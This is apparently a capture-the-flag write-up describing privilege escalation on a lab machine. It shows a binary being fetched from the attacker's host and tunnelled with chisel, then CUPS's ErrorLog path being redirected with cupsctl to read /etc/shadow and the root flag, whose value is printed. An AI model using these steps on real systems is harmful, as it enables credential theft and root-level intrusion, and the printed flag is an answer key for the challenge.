We can see what process are open.
```bash
$ netstat -tupln
``` 
![alt text](Images/Netstat.png)
```bash
$ netstat -nat
```
![alt text](Images/Netstat2.png)

We found that the 631 port is open. This port is used by Internet Printing Protocol by default. Let's install chisel to do port forwarding.

https://github.com/jpillora/chisel
```bash
$ git clone https://github.com/jpillora/chisel
$ cd chisel && go build -ldflags="-s -w"
$ sudo ./chisel server -p 8000 --reverse
```
Copy chisel to the server and issue below command on reverse shell session to do a port forward.

![alt text](Images/ReverseServer.png)

To install Chisel on the machine target we need to open a python server an in the target machine we need to go to the tmp directory to install there Chisel
```bash
$ python3 -m http.server 80
```
![alt text](Images/Server.png)

Now we download chisel from our machine.
```bash
$ wget http://10.10.14.15/chisel
$ chmod +x chisel
```

![alt text](Images/Chisel.png)

![alt text](Images/Chisel2.png)

Now we connect the target machine to our reverse server

![alt text](Images/ReverseServer.png)
```bash
$ ./chisel client 10.10.14.15:8000 R:631:127.0.0.1:631
```
![alt text](Images/Chisel3.png)

Browsing to localhost:631 on our machine shows CUPS administration page.

![alt text](Images/Localhost631.png)

CUPS versions less than 1.6.2 has a known local file read vulnerability. Navigate to Administration .

![alt text](Images/Localhost631_2.png)

By clicking on **View Error Log**, the contents of the `error.log` file are displayed. Since the CUPS server runs as **root** by default, it is possible to achieve **arbitrary file read** by modifying the path of the `ErrorLog` file. We can change the `ErrorLog` path using the `cupsctl
```bash
S cupsctl ErrorLog="/etc/shadow"
```
![alt text](Images/Cupsctl.png)

Now sending a cURL request to View Error Log reveals the contents of /etc/shadow file.
```bash
$ curl http://localhost:631/admin/log/error_log?
```
![alt text](Images/Curl.png)

Now if we do the following we will can get the root flag.
```bash
$ cupsctl ErrorLog=/root/root.txt
$ curl -s -X GET http://localhost:631/admin/log/error_log
```
![alt text](Images/RootFlag.png)
```bash
Root Flag → 23c9e1651c2a52ba8c25a3c505a3e73e
```

[Back](README.md)